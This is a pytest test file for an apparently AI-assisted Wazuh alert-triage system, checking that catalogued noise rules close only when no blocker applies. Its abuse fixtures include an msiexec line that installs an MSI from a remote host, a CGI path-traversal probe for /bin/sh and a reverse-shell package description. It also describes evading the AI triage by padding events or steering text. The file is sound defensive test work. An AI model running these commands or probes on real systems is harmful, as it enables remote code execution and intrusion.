"""The noise catalogue (FIX-2, decision policy v2.1): a catalogued vendor rule id lifts only ``unmapped``.

Alerts are built the way the workflow sees them: a Wazuh event through the
real normalizer, with the stored raw event added and the state size cap
applied (:func:`lg_sotf.core.graph.cap_alert`).
"""

from __future__ import annotations

import copy
import json
from datetime import UTC, datetime
from typing import Any, Dict, List, Optional

import pytest

from lg_sotf.core.graph import RAW_RULE_KEYS, cap_alert
from lg_sotf.domain import closure, routing
from lg_sotf.domain.closure import MODEL_CLOSED, UNMAPPED, model_close_blockers, model_close_class, never_close_class
from lg_sotf.domain.noise_families import (
    AUTH_FAILURE_GROUPS,
    CATALOGUE,
    CATALOGUE_VERSION,
    VENDOR_UNKNOWN,
    WAZUH,
    DetectionRule,
    detection_rule,
    noise_family,
)
from lg_sotf.domain.routing import RoutingThresholds
from lg_sotf.ingestion.normalizers import get_normalizer
from lg_sotf.ingestion.normalizers.base import NormalizeContext

T = RoutingThresholds()
AUTO = "auto_full_audit"
CTX = NormalizeContext(source_id="wazuh-push", source_type="webhook", now=datetime(2026, 11, 9, tzinfo=UTC))
DPKG = "New dpkg (Debian Package) installed."


def wazuh_event(rule_id: Any, description: str, *, level: int = 7, mitre: Optional[Dict[str, Any]] = None,
                full_log: str = "2026-11-09 10:00:00 status installed htop:amd64 3.3.0-4",
                groups: Optional[List[str]] = None) -> Dict[str, Any]:
    rule: Dict[str, Any] = {"id": rule_id, "level": level, "description": description,
                            "groups": groups if groups is not None else ["syslog", "dpkg"]}
    if mitre is not None:
        rule["mitre"] = mitre
    return {"timestamp": "2026-11-09T10:00:00.000+0000", "id": "1792751768.1", "rule": rule,
            "agent": {"id": "004", "name": "web-01", "ip": "10.20.2.61"}, "manager": {"name": "wazuh-manager"},
            "decoder": {"name": "dpkg-decoder"}, "full_log": full_log, "location": "/var/log/dpkg.log"}


def state_alert(event: Dict[str, Any]) -> Dict[str, Any]:
    """What ``initial_state`` puts in the workflow state: the canonical alert, its raw event, size-capped."""
    canonical = json.loads(get_normalizer("wazuh").normalize(event, CTX).model_dump_json())
    canonical["raw"] = copy.deepcopy(event)
    canonical["normalizer"] = "wazuh"  # what the ingestion service records after the Wazuh normalizer
    return cap_alert(canonical)


def wazuh_state(event: Dict[str, Any], **changes: Any) -> Dict[str, Any]:
    """Both model tiers benign within the thresholds, no rule evidence, no related alert (the closing case)."""
    alert = state_alert(event)
    state: Dict[str, Any] = {
        "severity": alert["severity"],
        "confidence": 25,
        "alert": alert,
        "triage": {"confidence": 25, "rule_fp": [], "rule_tp": [], "llm_used": True, "threat_assessment": "benign",
                   "threat_likelihood": 3},
        "correlation": {"related_count": 0, "related_dispositions": {}},
        "analysis": {"threat_score": 8, "certainty": 92, "verdict": "benign", "rule_threat_score": 40,
                     "rule_evidence": [], "rule_corroborated": False, "llm_used": True},
    }
    for path, value in changes.items():
        *parents, leaf = path.split(".")
        target = state
        for key in parents:
            target = target[key]
        target[leaf] = value
    return state


# --------------------------------------------------------------------------- the catalogue itself


def test_every_entry_records_its_family_rationale_and_the_abuse_it_could_hide() -> None:
    assert CATALOGUE_VERSION and CATALOGUE
    seen: Dict[str, str] = {}
    for entry in CATALOGUE:
        assert entry.vendor == WAZUH and entry.family and entry.rule_ids, entry
        assert len(entry.rationale) > 60 and len(entry.could_hide) > 10, entry.family
        assert entry.abuse_known is not entry.could_hide.lower().startswith("none known"), entry.family
        for rule_id in entry.rule_ids:
            assert rule_id.isdigit() and rule_id not in seen, (rule_id, entry.family)
            seen[rule_id] = entry.family
    assert {e.family for e in CATALOGUE if e.abuse_known} >= {"linux_package_install", "windows_software_install"}


@pytest.mark.parametrize(
    ("rule_id", "description", "family"),
    [
        ("2902", DPKG, "linux_package_install"),
        ("2933", "Yum package updated.", "linux_package_install"),
        ("60612", "Application installed Product: 7-Zip 24.08 (x64 edition) -- Installation completed.",
         "windows_software_install"),
        ("62130", "Windows Defender: Antimalware definitions updated successfully", "antivirus_status"),
        ("31101", "Web server 400 error code.", "web_client_error"),
    ],
)
def test_a_catalogued_rule_id_lifts_the_unmapped_class_and_closes_on_both_tiers(
    rule_id: str, description: str, family: str
) -> None:
    state = wazuh_state(wazuh_event(rule_id, description))
    assert never_close_class(state["alert"]) == UNMAPPED
    assert detection_rule(state["alert"]) == DetectionRule(WAZUH, rule_id)
    assert closure.catalogued_noise(state["alert"]).family == family  # type: ignore[union-attr]
    assert model_close_class(state["alert"]) is None
    decision = routing.decide(state, T, AUTO)
    assert (decision.route, decision.code) == ("close", MODEL_CLOSED)
    assert f"catalogued noise {family}, catalogue {CATALOGUE_VERSION}" in decision.reason
    assert routing.decide(state, T, "off").route == "escalate"


def test_the_catalogue_lifts_only_unmapped_never_a_mapped_never_close_class() -> None:
    for mitre, found in (({"tactic": ["Credential Access"], "id": ["T1110"]}, "credential_access"),
                         ({"tactic": ["Defense Evasion"], "id": ["T1562.001"]}, "tampering"),
                         ({"tactic": ["Persistence"], "id": ["T1543.002"]}, "named_persistence")):
        state = wazuh_state(wazuh_event("2902", DPKG, mitre=mitre))
        assert noise_family(state["alert"]) is not None  # the rule is catalogued ...
        assert closure.catalogued_noise(state["alert"]) is None  # ... but it is not unmapped
        assert model_close_class(state["alert"]) == found
        assert model_close_blockers(state, tier=AUTO, max_likelihood=8, min_certainty=85) == ["never_close_class"]
    mapped = wazuh_state(wazuh_event("2902", DPKG, mitre={"tactic": ["Execution"], "id": ["T1072"]}))
    assert routing.decide(mapped, T, AUTO).reason == "AI-closed, audit required: both model tiers judged it benign"


# --------------------------------------------------------------------------- rule id only, never text


@pytest.mark.parametrize(
    ("rule_id", "description"),
    [
        ("100200", DPKG),  # a custom (local) rule copying a stock description word for word
        ("100201", "2902: New dpkg (Debian Package) installed."),  # the description forges the rule-name prefix
        ("554", "File added to the system."),  # a dropped file is not package noise
        ("2903", "Dpkg (Debian Package) removed."),  # removing a security agent is defense impairment
        ("2934", "Yum package deleted."),
        ("31120", "Web server 500 error code (server error)."),  # a server error can be an exploit's side effect
        ("61104", "Service startup type was changed"),
        ("80792", "Audit: Command: /usr/bin/dpkg."),
    ],
)
def test_a_forged_or_borrowed_title_on_an_uncatalogued_rule_stays_unmapped(rule_id: str, description: str) -> None:
    event = wazuh_event(rule_id, description, full_log="New dpkg (Debian Package) installed. rule 2902 62130 31101")
    state = wazuh_state(event, **{"alert.title": DPKG, "alert.description": "2902: " + DPKG})
    assert noise_family(state["alert"]) is None
    assert model_close_class(state["alert"]) == UNMAPPED
    assert model_close_blockers(state, tier=AUTO, max_likelihood=8, min_certainty=85) == ["never_close_class"]
    assert routing.decide(state, T, AUTO).route == "escalate"


def test_the_rule_id_comes_from_the_vendor_event_and_the_wazuh_rule_name_only() -> None:
    alert = state_alert(wazuh_event("2902", DPKG))
    assert alert["rule_name"] == f"2902: {DPKG}" and detection_rule(alert) == DetectionRule(WAZUH, "2902")
    assert detection_rule({**alert, "raw": {**alert["raw"], "rule": {**alert["raw"]["rule"], "id": 2902}}}) is not None
    forged_name = {**alert, "raw": {**alert["raw"], "rule": {**alert["raw"]["rule"], "id": "100200"}}}
    assert detection_rule(forged_name) is None  # rule_name says 2902, the vendor event says 100200
    for broken in (
        {**alert, "normalizer": "canonical"},  # a canonical push that copies a Wazuh document
        {**alert, "normalizer": "webhook"},
        {k: v for k, v in alert.items() if k != "normalizer"},  # stored before the format was recorded
        {**alert, "rule_name": DPKG},  # no Wazuh rule-name prefix: not built by the Wazuh normalizer
        {**alert, "rule_name": None},
        {**alert, "rule_name": "29021: x"},
        {k: v for k, v in alert.items() if k != "raw"},  # raw dropped (state size cap): unknown
        {**alert, "raw": {"_omitted": "raw event too large for workflow state"}},
        {**alert, "raw": {"rule": "2902"}},
        {**alert, "raw": {"rule": {"id": True}}},
        {**alert, "raw": {"rule": {"id": ["2902"]}}},
        {**alert, "raw": {"rule": {"id": "2902a"}}},
        {**alert, "raw": {"rule": {"id": ""}}},
        {**alert, "raw": {"rule": {"id": "29" * 8}}},
        None, [], "2902",
    ):
        assert detection_rule(broken) is None, broken
        assert noise_family(broken) is None
        # Unmapped either way; a Wazuh-built alert whose rule cannot be read is vendor_unknown (re-check of #345).
        assert model_close_class(broken) in (UNMAPPED, VENDOR_UNKNOWN)
    # A title, description or rule name alone is never a rule id (a canonical alert without a vendor event).
    canonical = {"title": DPKG, "description": DPKG, "rule_name": f"2902: {DPKG}", "mitre": {}, "raw": {}}
    assert noise_family(canonical) is None and model_close_class(canonical) == UNMAPPED


def test_an_oversized_raw_event_keeps_its_rule_through_the_state_cap() -> None:
    """Re-check of #345: the cap replaces an oversized raw event but keeps ``raw.rule`` (id, level, description,
    groups, mitre), so an attacker who inflates an event cannot hide the rule's groups."""
    padding = {f"field{i}": "x" * 1_500 for i in range(30)}
    alert = state_alert({**wazuh_event("2902", DPKG), "data": padding})
    assert alert["raw"]["_omitted"] and alert["raw"]["rule"]["id"] == "2902" and "data" not in alert["raw"]
    assert closure.catalogued_noise(alert) is not None
    inflated = {**wazuh_event(*AUTH_FAILURES[2][:2], groups=AUTH_FAILURES[2][3], mitre=AUTH_FAILURES[2][4]),
                "data": padding}
    capped = state_alert(inflated)
    assert set(capped["raw"]["rule"]) == set(RAW_RULE_KEYS) and "invalid_login" in capped["raw"]["rule"]["groups"]
    assert never_close_class(capped) == "credential_access"
    huge = cap_alert({"title": "t", "raw": {"rule": {"id": "1", "groups": ["g" * 5_000] * 200, "x": "y"}, "z": "z" * 20_000}})
    kept = huge["raw"]["rule"]
    assert "x" not in kept and len(kept["groups"]) <= 20 and all(len(g) <= 200 for g in kept["groups"])


# --------------------------------------------------------------------------- every other condition still applies


@pytest.mark.parametrize(
    ("change", "blocker"),
    [
        ({"severity": "high"}, "severity"),
        ({"severity": "critical"}, "severity"),
        ({"triage.rule_tp": ["prompt_injection_suspected"]}, "steering_text"),
        ({"analysis.rule_evidence": ["prior_malicious_history"]}, "recent_true_positive"),
        ({"analysis.rule_corroborated": True}, "recent_true_positive"),
        ({"correlation.related_dispositions": {"malicious": 1}}, "recent_true_positive"),
        ({"correlation": {"related_count": 2, "related_dispositions": {}}}, "campaign_in_progress"),
        ({"triage.threat_likelihood": 9}, "fast_tier_not_benign"),
        ({"triage.threat_assessment": "suspicious"}, "fast_tier_not_benign"),
        ({"triage.llm_used": False}, "fast_tier_not_benign"),
        ({"analysis.certainty": 84}, "deep_tier_not_benign"),
        ({"analysis.verdict": "inconclusive"}, "deep_tier_not_benign"),
    ],
)
def test_every_other_condition_still_blocks_a_catalogued_rule(change: Dict[str, Any], blocker: str) -> None:
    state = wazuh_state(wazuh_event("2902", DPKG), **change)
    assert model_close_blockers(state, tier=AUTO, max_likelihood=8, min_certainty=85) == [blocker]
    assert routing.decide(state, T, AUTO).route != "close"
    assert model_close_blockers(state, tier="off", max_likelihood=8, min_certainty=85)[0] == "tier_off"


def test_a_high_level_catalogued_rule_never_closes_on_the_models_word() -> None:
    state = wazuh_state(wazuh_event("2902", DPKG, level=12))
    assert state["severity"] == "high"
    assert routing.decide(state, T, AUTO).route == "escalate"


# --------------------------------------------------------------------------- the abuse each family could hide

ABUSE = [
    ("2902", DPKG, "status installed sysupdate-helper:amd64 1.0 (postinst opens a reverse shell)"),
    ("2932", "New Yum package installed.", "Installed: kernel-tools-helper-0.1-1.x86_64 (unsigned, from /tmp)"),
    ("60612", "Application installed Product: AnyDesk -- Installation completed successfully.",
     "MsiInstaller: msiexec /q /i http://203.0.113.9/a.msi"),
    ("31101", "Web server 400 error code.", "GET /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1 400"),
]
MALICIOUS_VERDICTS = [
    # The deep tier says malicious, the fast tier a likely threat.
    {"triage.threat_assessment": "likely_threat", "triage.threat_likelihood": 85, "analysis.verdict": "malicious",
     "analysis.threat_score": 90, "analysis.certainty": 90},
    # The deep tier says malicious at a low threat score.
    {"analysis.verdict": "malicious", "analysis.threat_score": 20, "analysis.certainty": 70},
    # Only the fast tier is suspicious; the deep tier was persuaded.
    {"triage.threat_assessment": "suspicious", "triage.threat_likelihood": 40},
    # The deep tier cannot tell.
    {"analysis.verdict": "inconclusive", "analysis.threat_score": 50, "analysis.certainty": 40},
]


@pytest.mark.parametrize(("rule_id", "description", "log"), ABUSE)
@pytest.mark.parametrize("verdict", MALICIOUS_VERDICTS)
def test_a_malicious_or_suspicious_model_verdict_on_a_catalogued_rule_still_escalates(
    rule_id: str, description: str, log: str, verdict: Dict[str, Any]
) -> None:
    """Malicious package install, software install as execution, web probing: the catalogue never decides the
    verdict, so a model that sees the abuse sends it to a person (an analyst or a response plan) at every tier."""
    state = wazuh_state(wazuh_event(rule_id, description, full_log=log), **verdict)
    assert closure.catalogued_noise(state["alert"]) is not None
    for tier in ("off", AUTO):
        decision = routing.decide(state, T, tier)
        assert decision.route in ("escalate", "plan_response") and decision.disposition != "benign", (tier, decision)


# --------------------------------------------------------------------------- review of #345 (H1): authentication failures

WIN = ["windows", "windows_security"]
AUTH_FAILURES = [
    # (rule id, description, level, groups, mitre): Wazuh 4.14 stock rules mapped outside credential access.
    ("60122", "Logon Failure - Unknown user or bad password", 5, WIN + ["authentication_failed"],
     {"id": ["T1531"], "tactic": ["Impact"]}),
    ("60130", "Logon Failure - Account locked out", 5, WIN + ["authentication_failed"],
     {"id": ["T1531"], "tactic": ["Impact"]}),
    ("99919", "Failed logon from malicious IP", 10, ["authentication_failed", "invalid_login"],
     {"id": ["T1078"], "tactic": ["Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"]}),
    ("60196", "Possible replay attack", 8, WIN + ["authentication_failures"],
     {"id": ["T1550"], "tactic": ["Defense Evasion", "Lateral Movement"]}),
    ("5302", "User missed the password to change UID to root.", 9, ["syslog", "su", "authentication_failed"],
     {"id": ["T1548.003"], "tactic": ["Privilege Escalation", "Defense Evasion"]}),
    # No authentication-failure group: listed by rule id.
    ("6250", "Asterisk: Multiple failed logins (user enumeration in process).", 10, ["asterisk", "syslog"], None),
    ("44733", "FortiAuth: Authentication failed.", 5, ["fortiauth"], {"id": ["T1078"], "tactic": ["Initial Access"]}),
]


@pytest.mark.parametrize(("rule_id", "description", "level", "groups", "mitre"), AUTH_FAILURES)
def test_review_h1_authentication_failures_are_credential_access_whatever_their_mapping(
    rule_id: str, description: str, level: int, groups: List[str], mitre: Optional[Dict[str, Any]]
) -> None:
    """A password spray of one rule repeating looks like noise to the campaign check, so authentication failures
    must be a never-close class on their own: by the vendor rule's groups, a listed rule id, or T1531."""
    event = wazuh_event(rule_id, description, level=level, mitre=mitre, groups=groups,
                        full_log="An account failed to log on. Account Name: svc-backup Failure Reason: bad password")
    state = wazuh_state(event, severity="medium")
    assert never_close_class(state["alert"]) == "credential_access"
    assert model_close_class(state["alert"]) == "credential_access"
    assert model_close_blockers(state, tier=AUTO, max_likelihood=8, min_certainty=85) == ["never_close_class"]
    assert routing.decide(state, T, AUTO).route == "escalate"
    # The groups and ids only ever block, so they count whatever format built the alert.
    pushed = {**state["alert"], "normalizer": "canonical"}
    assert never_close_class(pushed) == "credential_access"


def test_review_h1_the_groups_are_matched_exactly_and_t1531_alone_is_enough() -> None:
    assert AUTH_FAILURE_GROUPS == {"authentication_failed", "authentication_failures", "invalid_login", "login_denied"}
    assert never_close_class({"mitre": {"tactics": ["Impact"], "techniques": ["T1531"]}}) == "credential_access"
    ok = state_alert(wazuh_event("60106", "Windows logon success", groups=WIN + ["authentication_success"],
                                 mitre={"id": ["T1078"], "tactic": ["Initial Access"]}))
    assert never_close_class(ok) is None
    upper = state_alert(wazuh_event("100300", "Custom", groups=["Authentication_Failed "],
                                    mitre={"id": ["T1078"], "tactic": ["Initial Access"]}))
    assert never_close_class(upper) == "credential_access"


def test_recheck_a_wazuh_alert_without_a_readable_rule_never_closes() -> None:
    """Re-check of #345: when the raw event is gone altogether, a Wazuh-built alert's groups are unknown: it is
    vendor_unknown, a never-close class that also blocks the catalogue lift. 99919 (T1078) no longer slips through."""
    for case in (AUTH_FAILURES[0], AUTH_FAILURES[2]):
        alert = state_alert(wazuh_event(*case[:2], groups=case[3], mitre=case[4]))
        gone = {k: v for k, v in alert.items() if k != "raw"}
        assert never_close_class(gone) in ("credential_access", VENDOR_UNKNOWN)
        assert never_close_class({**gone, "raw": {"_omitted": "x"}}) in ("credential_access", VENDOR_UNKNOWN)
    bad_ip = state_alert(wazuh_event(*AUTH_FAILURES[2][:2], groups=AUTH_FAILURES[2][3], mitre=AUTH_FAILURES[2][4]))
    assert never_close_class({k: v for k, v in bad_ip.items() if k != "raw"}) == VENDOR_UNKNOWN
    package = state_alert(wazuh_event("2902", DPKG))
    gone = {k: v for k, v in package.items() if k != "raw"}
    assert model_close_class(gone) == VENDOR_UNKNOWN
    state = wazuh_state(wazuh_event("2902", DPKG))
    state["alert"] = gone
    assert routing.decide(state, T, AUTO).route == "escalate"
    # Another format without a raw rule stays as before: its ATT&CK mapping decides.
    assert never_close_class({**gone, "normalizer": "canonical"}) == UNMAPPED



def test_final_a_cut_groups_list_never_closes() -> None:
    """Final check of #345: with more groups than the state keeps, an authentication-failure group could sit past the
    cut, so the alert is vendor_unknown (fail closed); one inside the cut still reads as credential access."""
    padding = {f"field{i}": "x" * 1_500 for i in range(30)}
    many = [f"group{i}" for i in range(25)] + ["authentication_failed"]
    oversized = state_alert({**wazuh_event("60122", "Logon Failure", groups=many,
                                           mitre={"id": ["T1078"], "tactic": ["Initial Access"]}), "data": padding})
    assert oversized["raw"]["rule"]["groups_truncated"] is True
    assert "authentication_failed" not in oversized["raw"]["rule"]["groups"]
    assert never_close_class(oversized) == VENDOR_UNKNOWN
    package = state_alert({**wazuh_event("2902", DPKG, groups=many[:25]), "data": padding})
    assert model_close_class(package) == VENDOR_UNKNOWN  # the cut also blocks the catalogue lift
    kept_whole = state_alert(wazuh_event("2902", DPKG, groups=[f"group{i}" for i in range(60)]))
    assert kept_whole["raw"]["rule"]["groups_truncated"] is True and model_close_class(kept_whole) == VENDOR_UNKNOWN
    early = state_alert({**wazuh_event("60122", "Logon Failure", groups=["authentication_failed"] + many,
                                       mitre={"id": ["T1078"], "tactic": ["Initial Access"]}), "data": padding})
    assert never_close_class(early) == "credential_access"
    few = state_alert({**wazuh_event("2902", DPKG), "data": padding})
    assert "groups_truncated" not in few["raw"]["rule"] and model_close_class(few) is None
